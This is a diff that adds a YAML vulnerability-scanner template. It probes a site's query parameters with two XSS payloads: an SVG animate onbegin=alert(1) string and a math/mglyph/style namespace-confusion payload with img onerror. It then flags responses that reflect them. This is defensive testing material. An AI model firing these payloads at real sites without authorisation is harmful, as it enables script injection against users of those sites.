@@ -1,0 +1,29 @@
+id: xss-svg-namespace
+info:
+  name: XSS via SVG/XML Namespace Injection
+  author: WhiteFatalis
+  severity: medium
+  description: Checks for XSS in XML/SVG contexts or where SVG is allowed but not sanitized properly.
+  tags: xss, svg
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?q=<svg><animate onbegin=alert(1) attributeName=x dur=1s>"
+      - "{{BaseURL}}/search?q=<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<svg><animate onbegin=alert(1)"
+          - "<math><mtext><table><mglyph>"
+        condition: or
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+          - "image/svg+xml"
+        condition: or
